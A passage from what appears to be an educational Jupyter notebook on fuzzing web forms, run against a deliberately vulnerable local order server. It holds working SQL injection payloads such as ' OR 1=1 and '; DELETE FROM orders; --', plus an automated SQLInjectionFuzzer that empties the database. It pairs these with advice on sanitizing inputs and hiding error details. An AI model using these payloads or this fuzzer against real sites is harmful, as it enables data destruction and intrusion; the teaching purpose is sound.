       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:04] \"GET /order?item=drill&name=Jane',+'x',+'x',+'x')%3B+DELETE+FROM+orders%3B+--&email=j.doe%40example.com&city=New+York&zip=14083 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "contents = webbrowser(urljoin(httpd_url, order_with_injected_sql))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "All orders are now gone:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 148,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.940488Z",
     "iopub.status.busy": "2021-11-01T22:34:04.939968Z",
     "iopub.status.idle": "2021-11-01T22:34:04.942011Z",
     "shell.execute_reply": "2021-11-01T22:34:04.942393Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "This effect is also illustrated [in this very popular XKCD comic](https://xkcd.com/327/):"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "![https://xkcd.com/327/](PICS/xkcd_exploits_of_a_mom.png){width=100%}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Even if we had not been able to execute arbitrary commands, being able to compromise an orders database offers several possibilities for mischief.  For instance, we could use the address and matching credit card number of an existing person to go through validation and submit an order, only to have the order then delivered to an address of our choice.  We could also use SQL injection to inject HTML and JavaScript  code as above, bypassing possible sanitization geared at these domains."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To avoid such effects, the remedy is to _sanitize_ all third-party inputs – no character in the input must be interpretable as plain HTML, JavaScript, or SQL.  This is achieved by properly _quoting_ and _escaping_ inputs.  The [exercises](#Exercises) give some instructions on what to do."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Leaking Internal Information\n",
    "\n",
    "To craft the above SQL queries, we have used _insider information_ – for instance, we knew the name of the table as well as its structure.  Surely, an attacker would not know this and thus not be able to run the attack, right?  Unfortunately, it turns out we are leaking all of this information out to the world in the first place.  The error message produced by our server reveals everything we need:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 149,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.946045Z",
     "iopub.status.busy": "2021-11-01T22:34:04.945485Z",
     "iopub.status.idle": "2021-11-01T22:34:04.951526Z",
     "shell.execute_reply": "2021-11-01T22:34:04.951940Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "answer = webbrowser(urljoin(httpd_url, \"/order\"), mute=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 150,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.955572Z",
     "iopub.status.busy": "2021-11-01T22:34:04.954935Z",
     "iopub.status.idle": "2021-11-01T22:34:04.957406Z",
     "shell.execute_reply": "2021-11-01T22:34:04.957770Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  <pre>Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_11807/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'item'\n",
       "</pre>\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 150,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(answer)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The best way to avoid information leakage through failures is of course not to fail in the first place.  But if you fail, make it hard for the attacker to establish a link between the attack and the failure.  Do not produce \"internal error\" messages (and certainly not ones with internal information); do not become unresponsive; just go back to the home page and ask the user to supply correct data.  One more time, the [exercises](#Exercises) give some instructions on how to fix the server."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "If you can manipulate the server not only to alter information, but also to _retrieve_ information, you can learn about table names and structure by accessing special _tables_ (also called *data dictionary*) in which database servers store their metadata.  In the MySQL server, for instance, the special table `information_schema` holds metadata such as the names of databases and tables, data types of columns, or access privileges."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Fully Automatic Web Attacks"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "So far, we have demonstrated the above attacks using our manually written order grammar.  However, the attacks also work for generated grammars.  We extend `HTMLGrammarMiner` by adding a number of common SQL injection attacks:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 151,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.962887Z",
     "iopub.status.busy": "2021-11-01T22:34:04.962367Z",
     "iopub.status.idle": "2021-11-01T22:34:04.964025Z",
     "shell.execute_reply": "2021-11-01T22:34:04.964390Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SQLInjectionGrammarMiner(HTMLGrammarMiner):\n",
    "    ATTACKS = [\n",
    "        \"<string>' <sql-values>); <sql-payload>; <sql-comment>\",\n",
    "        \"<string>' <sql-comment>\",\n",
    "        \"' OR 1=1<sql-comment>'\",\n",
    "        \"<number> OR 1=1\",\n",
    "    ]\n",
    "\n",
    "    def __init__(self, html_text, sql_payload):\n",
    "        super().__init__(html_text)\n",
    "\n",
    "        self.QUERY_GRAMMAR = extend_grammar(self.QUERY_GRAMMAR, {\n",
    "            \"<text>\": [\"<string>\", \"<sql-injection-attack>\"],\n",
    "            \"<number>\": [\"<digits>\", \"<sql-injection-attack>\"],\n",
    "            \"<checkbox>\": [\"<_checkbox>\", \"<sql-injection-attack>\"],\n",
    "            \"<email>\": [\"<_email>\", \"<sql-injection-attack>\"],\n",
    "            \"<sql-injection-attack>\": [\n",
    "                cgi_encode(attack, \"<->\") for attack in self.ATTACKS\n",
    "            ],\n",
    "            \"<sql-values>\": [\"\", cgi_encode(\"<sql-values>, '<string>'\", \"<->\")],\n",
    "            \"<sql-payload>\": [cgi_encode(sql_payload)],\n",
    "            \"<sql-comment>\": [\"--\", \"#\"],\n",
    "        })"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 152,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.967882Z",
     "iopub.status.busy": "2021-11-01T22:34:04.967372Z",
     "iopub.status.idle": "2021-11-01T22:34:04.969173Z",
     "shell.execute_reply": "2021-11-01T22:34:04.969537Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "html_miner = SQLInjectionGrammarMiner(\n",
    "    html_text, sql_payload=\"DROP TABLE orders\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.975031Z",
     "iopub.status.busy": "2021-11-01T22:34:04.974462Z",
     "iopub.status.idle": "2021-11-01T22:34:04.976686Z",
     "shell.execute_reply": "2021-11-01T22:34:04.977114Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'<start>': ['<action>?<query>'],\n",
       " '<string>': ['<letter>', '<letter><string>'],\n",
       " '<letter>': ['<plus>', '<percent>', '<other>'],\n",
       " '<plus>': ['+'],\n",
       " '<percent>': ['%<hexdigit-1><hexdigit>'],\n",
       " '<hexdigit>': ['0',\n",
       "  '1',\n",
       "  '2',\n",
       "  '3',\n",
       "  '4',\n",
       "  '5',\n",
       "  '6',\n",
       "  '7',\n",
       "  '8',\n",
       "  '9',\n",
       "  'a',\n",
       "  'b',\n",
       "  'c',\n",
       "  'd',\n",
       "  'e',\n",
       "  'f'],\n",
       " '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'],\n",
       " '<text>': ['<string>', '<sql-injection-attack>'],\n",
       " '<number>': ['<digits>', '<sql-injection-attack>'],\n",
       " '<digits>': ['<digit>', '<digits><digit>'],\n",
       " '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],\n",
       " '<checkbox>': ['<_checkbox>', '<sql-injection-attack>'],\n",
       " '<_checkbox>': ['on', 'off'],\n",
       " '<email>': ['<_email>', '<sql-injection-attack>'],\n",
       " '<_email>': ['<string>%40<string>'],\n",
       " '<hexdigit-1>': ['3', '4', '5', '6', '7'],\n",
       " '<submit>': [''],\n",
       " '<sql-injection-attack>': [\"<string>'+<sql-values>)%3b+<sql-payload>%3b+<sql-comment>\",\n",
       "  \"<string>'+<sql-comment>\",\n",
       "  \"'+OR+1%3d1<sql-comment>'\",\n",
       "  '<number>+OR+1%3d1'],\n",
       " '<sql-values>': ['', \"<sql-values>,+'<string>'\"],\n",
       " '<sql-payload>': ['DROP+TABLE+orders'],\n",
       " '<sql-comment>': ['--', '#'],\n",
       " '<action>': ['/order'],\n",
       " '<item>': ['item=<item-value>'],\n",
       " '<item-value>': ['tshirt', 'drill', 'lockset'],\n",
       " '<name>': ['name=<text>'],\n",
       " '<email-1>': ['email=<email>'],\n",
       " '<city>': ['city=<text>'],\n",
       " '<zip>': ['zip=<number>'],\n",
       " '<terms>': ['terms=<checkbox>'],\n",
       " '<submit-1>': ['submit=<submit>'],\n",
       " '<query>': ['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']}"
      ]
     },
     "execution_count": 153,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar = html_miner.mine_grammar()\n",
    "grammar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 154,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.980446Z",
     "iopub.status.busy": "2021-11-01T22:34:04.979928Z",
     "iopub.status.idle": "2021-11-01T22:34:04.982095Z",
     "shell.execute_reply": "2021-11-01T22:34:04.982459Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<string>', '<sql-injection-attack>']"
      ]
     },
     "execution_count": 154,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<text>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We see that several fields now are tested for vulnerabilities:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 155,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.992009Z",
     "iopub.status.busy": "2021-11-01T22:34:04.991269Z",
     "iopub.status.idle": "2021-11-01T22:34:04.995409Z",
     "shell.execute_reply": "2021-11-01T22:34:04.995772Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"/order?item=lockset&name=4+OR+1%3d1&email=%66%40%3ba&city=%7a&zip=99&terms=1'+#&submit=\""
      ]
     },
     "execution_count": 155,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_fuzzer = GrammarFuzzer(grammar)\n",
    "sql_fuzzer.fuzz()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 156,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.999802Z",
     "iopub.status.busy": "2021-11-01T22:34:04.999219Z",
     "iopub.status.idle": "2021-11-01T22:34:05.001356Z",
     "shell.execute_reply": "2021-11-01T22:34:05.001729Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 157,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.005422Z",
     "iopub.status.busy": "2021-11-01T22:34:05.004642Z",
     "iopub.status.idle": "2021-11-01T22:34:05.013661Z",
     "shell.execute_reply": "2021-11-01T22:34:05.014034Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:05] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:05] \"GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "contents = webbrowser(urljoin(httpd_url,\n",
    "                              \"/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.018093Z",
     "iopub.status.busy": "2021-11-01T22:34:05.017528Z",
     "iopub.status.idle": "2021-11-01T22:34:05.019165Z",
     "shell.execute_reply": "2021-11-01T22:34:05.019536Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def orders_db_is_empty():\n",
    "    try:\n",
    "        entries = db.execute(\"SELECT * FROM orders\").fetchall()\n",
    "    except sqlite3.OperationalError:\n",
    "        return True\n",
    "    return len(entries) == 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.022741Z",
     "iopub.status.busy": "2021-11-01T22:34:05.022217Z",
     "iopub.status.idle": "2021-11-01T22:34:05.024784Z",
     "shell.execute_reply": "2021-11-01T22:34:05.025154Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 159,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "orders_db_is_empty()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.029334Z",
     "iopub.status.busy": "2021-11-01T22:34:05.028771Z",
     "iopub.status.idle": "2021-11-01T22:34:05.030308Z",
     "shell.execute_reply": "2021-11-01T22:34:05.030679Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SQLInjectionFuzzer(WebFormFuzzer):\n",
    "    def __init__(self, url, sql_payload=\"\", **kwargs):\n",
    "        self.sql_payload = sql_payload\n",
    "        super().__init__(url, **kwargs)\n",
    "\n",
    "    def get_grammar(self, html_text):\n",
    "        grammar_miner = SQLInjectionGrammarMiner(\n",
    "            html_text, sql_payload=self.sql_payload)\n",
    "        return grammar_miner.mine_grammar()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 161,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.034892Z",
     "iopub.status.busy": "2021-11-01T22:34:05.034314Z",
     "iopub.status.idle": "2021-11-01T22:34:05.722101Z",
     "shell.execute_reply": "2021-11-01T22:34:05.722545Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "sql_fuzzer = SQLInjectionFuzzer(httpd_url, \"DELETE FROM orders\")\n",
    "web_runner = WebRunner(httpd_url)\n",
    "trials = 1\n",
    "\n",
    "while True:\n",
    "    sql_fuzzer.run(web_runner)\n",
    "    if orders_db_is_empty():\n",
    "        break\n",
    "    trials += 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 162,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.726381Z",
     "iopub.status.busy": "2021-11-01T22:34:05.725769Z",
     "iopub.status.idle": "2021-11-01T22:34:05.728254Z",
     "shell.execute_reply": "2021-11-01T22:34:05.728627Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "68"
      ]
     },
     "execution_count": 162,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "trials"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Our attack was successful! After less than a second of testing, our database is empty:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.733215Z",
     "iopub.status.busy": "2021-11-01T22:34:05.732464Z",
     "iopub.status.idle": "2021-11-01T22:34:05.735417Z",
     "shell.execute_reply": "2021-11-01T22:34:05.735816Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 163,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "orders_db_is_empty()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Again, note the level of possible automation: We can\n",
    "\n",
    "* Crawl the Web pages of a host for possible forms\n",
    "* Automatically identify form fields and possible values\n",
    "* Inject SQL (or HTML, or JavaScript) into any of these fields\n",
    "\n",
    "and all of this fully automatically, not needing anything but the URL of the site."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The bad news is that with a tool set as the above, anyone can attack web sites.  The even worse news is that such penetration tests take place every day, on every web site.  The good news, though, is that after reading this chapter, you now get an idea of how Web servers are attacked every day – and what you as a Web server maintainer could and should do to prevent this."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Synopsis\n",
    "\n",
    "This chapter provides a simple (and vulnerable) Web server and two experimental fuzzers that are applied to it."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Fuzzing Web Forms\n",
    "\n",
    "`WebFormFuzzer` demonstrates how to interact with a Web form.  Given a URL with a Web form, it automatically extracts a grammar that produces a URL; this URL contains values for all form elements.  Support is limited to GET forms and a subset of HTML form elements."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Here's the grammar extracted for our vulnerable Web server:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 164,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.739977Z",
     "iopub.status.busy": "2021-11-01T22:34:05.739295Z",
     "iopub.status.idle": "2021-11-01T22:34:05.746542Z",
     "shell.execute_reply": "2021-11-01T22:34:05.746926Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "web_form_fuzzer = WebFormFuzzer(httpd_url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 165,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.751251Z",
     "iopub.status.busy": "2021-11-01T22:34:05.750536Z",
     "iopub.status.idle": "2021-11-01T22:34:05.753763Z",
     "shell.execute_reply": "2021-11-01T22:34:05.754442Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<action>?<query>']"
      ]
     },
     "execution_count": 165,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer.grammar['<start>']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.758497Z",
     "iopub.status.busy": "2021-11-01T22:34:05.757919Z",
     "iopub.status.idle": "2021-11-01T22:34:05.760250Z",
     "shell.execute_reply": "2021-11-01T22:34:05.760618Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order']"
      ]
     },
     "execution_count": 166,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer.grammar['<action>']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.764865Z",
     "iopub.status.busy": "2021-11-01T22:34:05.764000Z",
     "iopub.status.idle": "2021-11-01T22:34:05.767193Z",
     "shell.execute_reply": "2021-11-01T22:34:05.767579Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']"
      ]
     },
     "execution_count": 167,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer.grammar['<query>']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Using it for fuzzing yields a path with all form values filled; accessing this path acts like filling out and submitting the form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 168,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.778170Z",
     "iopub.status.busy": "2021-11-01T22:34:05.777638Z",
     "iopub.status.idle": "2021-11-01T22:34:05.779956Z",
     "shell.execute_reply": "2021-11-01T22:34:05.780331Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=lockset&name=%43+&email=+c%40_+c&city=%37b_4&zip=5&terms=on&submit='"
      ]
     },
     "execution_count": 168,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer.fuzz()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Repeated calls to `WebFormFuzzer.fuzz()` invoke the form again and again, each time with different (fuzzed) values."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### SQL Injection Attacks\n",
    "\n",
    "`SQLInjectionFuzzer` is an experimental extension of `WebFormFuzzer` whose constructor takes an additional _payload_ – an SQL command to be injected and executed on the server.  Otherwise, it is used like `WebFormFuzzer`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.786407Z",
     "iopub.status.busy": "2021-11-01T22:34:05.785661Z",
     "iopub.status.idle": "2021-11-01T22:34:05.797219Z",
     "shell.execute_reply": "2021-11-01T22:34:05.797633Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"/order?item=lockset&name=+&email=0%404&city=+'+)%3b+DELETE+FROM+orders%3b+--&zip='+OR+1%3d1--'&terms=on&submit=\""
      ]
     },
     "execution_count": 169,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_fuzzer = SQLInjectionFuzzer(httpd_url, \"DELETE FROM orders\")\n",
    "sql_fuzzer.fuzz()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "As you can see, the path to be retrieved contains the payload encoded into one of the form field values."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "`SQLInjectionFuzzer` is a proof-of-concept on how to build a malicious fuzzer; you should study and extend its code to make actual use of it."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": true,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Lessons Learned\n",
    "\n",
    "* User Interfaces (in the Web and elsewhere) should be tested with _expected_ and _unexpected_ values.\n",
    "* One can _mine grammars from user interfaces_, allowing for their widespread testing.\n",
    "* Consequent _sanitizing_ of inputs prevents common attacks such as code and SQL injection.\n",
    "* Do not attempt to write a Web server yourself, as you are likely to repeat all the mistakes of others."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We're done, so we can clean up:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.802944Z",
     "iopub.status.busy": "2021-11-01T22:34:05.802219Z",
     "iopub.status.idle": "2021-11-01T22:34:05.808805Z",
     "shell.execute_reply": "2021-11-01T22:34:05.809244Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "clear_httpd_messages()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 171,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.812452Z",
     "iopub.status.busy": "2021-11-01T22:34:05.811936Z",
     "iopub.status.idle": "2021-11-01T22:34:05.814324Z",
     "shell.execute_reply": "2021-11-01T22:34:05.814862Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "httpd_process.terminate()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Next Steps\n",
    "\n",
    "From here, the next step is [GUI Fuzzing](GUIFuzzer.ipynb), going from HTML- and Web-based user interfaces to generic user interfaces (including JavaScript and mobile user interfaces).\n",
    "\n",
    "If you are interested in security testing, do not miss our [chapter on information flow](InformationFlow.ipynb), showing how to systematically detect information leaks; this also addresses the issue of SQL Injection attacks."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Background\n",
    "\n",
    "The [Wikipedia pages on Web application security](https://en.wikipedia.org/wiki/Web_application_security) are a mandatory read for anyone building, maintaining, or testing Web applications.  In 2012, cross-site scripting and SQL injection, as discussed in this chapter, made up more than 50% of Web application vulnerabilities.\n",
    "\n",
    "The [Wikipedia page on penetration testing](https://en.wikipedia.org/wiki/Penetration_test) provides a comprehensive overview on the history of penetration testing, as well as collections of vulnerabilities.\n",
    "\n",
    "The [OWASP Zed Attack Proxy Project](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) (ZAP) is an open source Web site security scanner including several of the features discussed above, and many many more."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": true,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Exercises"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Exercise 1: Fix the Server\n",
    "\n",
    "Create a `BetterHTTPRequestHandler` class that fixes the several issues of `SimpleHTTPRequestHandler`:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "#### Part 1: Silent Failures\n",
    "\n",
    "Set up the server such that it does not reveal internal information – in particular, tracebacks and HTTP status codes."
   ]
  },
  {
   "cell_type": "markdown",
